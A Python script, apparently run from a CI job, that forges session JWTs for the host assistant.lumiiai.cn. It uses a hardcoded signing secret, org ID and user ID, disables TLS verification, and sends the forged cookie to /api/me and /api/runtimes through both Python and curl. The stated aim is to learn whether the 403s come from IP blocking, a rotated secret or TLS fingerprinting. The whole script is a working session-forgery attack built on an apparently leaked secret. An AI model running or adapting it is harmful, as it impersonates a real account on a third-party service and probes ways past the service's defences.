#!/usr/bin/env python3
# Diagnostic: why 403? distinguish IP-block vs secret-rotated vs TLS-fingerprint.
import os, sys, json, time, uuid, base64, hmac, hashlib, ssl, http.client, subprocess

REF = os.environ.get("GITHUB_REF_NAME", "") or ""
if "result" in REF:
    print("results-branch-skip", flush=True); sys.exit(0)

HOST = "assistant.lumiiai.cn"
ORG = "org_bTLzxtBLmugV8uxx4QTyw"
SUB = "usr_ZxLewKrgbRYSm7rWDtQX8"
JWT_SECRET = "297b8a491bc1920b918d01de77166556d3f835f473968c6b"
CTX = ssl.create_default_context(); CTX.check_hostname=False; CTX.verify_mode=ssl.CERT_NONE

def b64u(b):
    if isinstance(b,str): b=b.encode()
    return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

def jwt(sub, org=ORG):
    now=int(time.time())
    h=b64u(json.dumps({"alg":"HS256","typ":"JWT"},separators=(",",":")))
    p=b64u(json.dumps({"sub":sub,"org":org,"iat":now,"exp":now+2592000,"sid":"sid_"+str(uuid.uuid4()),"lgn":now},separators=(",",":")))
    sig=hmac.new(JWT_SECRET.encode(),(h+"."+p).encode(),hashlib.sha256).digest()
    return "lumii_session="+h+"."+p+"."+b64u(sig)

COOKIE=jwt(SUB)

def preq(path, cookie=None, timeout=20):
    headers={"Accept":"*/*","User-Agent":"Mozilla/5.0","Connection":"close"}
    if cookie: headers["Cookie"]=cookie
    c=None
    try:
        c=http.client.HTTPSConnection(HOST,443,timeout=timeout,context=CTX)
        c.request("GET",path,headers=headers)
        r=c.getresponse(); b=r.read()
        return r.status, dict(r.getheaders()), b
    except Exception as e:
        return -1, {}, ("ERR:"+repr(e)).encode()
    finally:
        try:
            if c: c.close()
        except: pass

def csh(cmd):
    try:
        r=subprocess.run(cmd,shell=True,capture_output=True,text=True,timeout=40)
        return (r.returncode,(r.stdout or "")+(("[stderr]"+(r.stderr or "")) if r.stderr else ""))
    except Exception as e:
        return -1, repr(e)

print("=== EGRESS IP ===", flush=True)
for c in ["curl -s -m 10 https://api.ipify.org", "curl -s -m 10 https://ifconfig.me", "curl -s -m 10 https://api.github.com/zen"]:
    rc,out=csh(c); print("CMD:",c,"rc",rc,"->",out[:200].replace("\n"," "), flush=True)

def show(tag, st, hd, b):
    hd2={k:v for k,v in hd.items() if k.lower() in ("server","content-type","cf-ray","x-powered-by","content-length","x-request-id","vary","set-cookie","date","via","x-cache","cf-mitigated","x-trace")}
    print("[%s] status=%s hdrs=%s bodylen=%d body=%r" % (tag, st, json.dumps(hd2,ensure_ascii=False), len(b or b""), (b[:400] if isinstance(b,bytes) else str(b)[:400])), flush=True)

print("=== python http.client ===")
for tag,ck in [("no-cookie",None),("forged-cookie",COOKIE),("garbage-cookie","lumii_session=abc.def.ghi")]:
    for path in ["/health","/api/me"]:
        st,hd,b=preq(path,ck)
        show(tag+" "+path, st,hd,b)

print("=== curl (different TLS fp) ===")
for tag,extra in [("no-cookie",""),("forged-cookie",'-H "Cookie: %s"'%COOKIE),("garbage",'-H "Cookie: lumii_session=abc.def.ghi"')]:
    for path in ["/health","/api/me","/api/runtimes"]:
        cmd='curl -sS -m 15 -o /tmp/bo -D /tmp/ho %s "https://%s%s" ; echo "STATUS_LINE:"; head -1 /tmp/ho; echo "HDRS:"; grep -iE "^(server|content-type|cf-ray|cf-mitigated|set-cookie|x-)" /tmp/ho; echo "BODY:"; head -c 300 /tmp/bo' % (extra,HOST,path)
        rc,out=csh(cmd)
        print("[curl %s %s] rc=%s %s" % (tag,path,rc,out[:500].replace("\n"," | ")), flush=True)

print("DONE", flush=True)
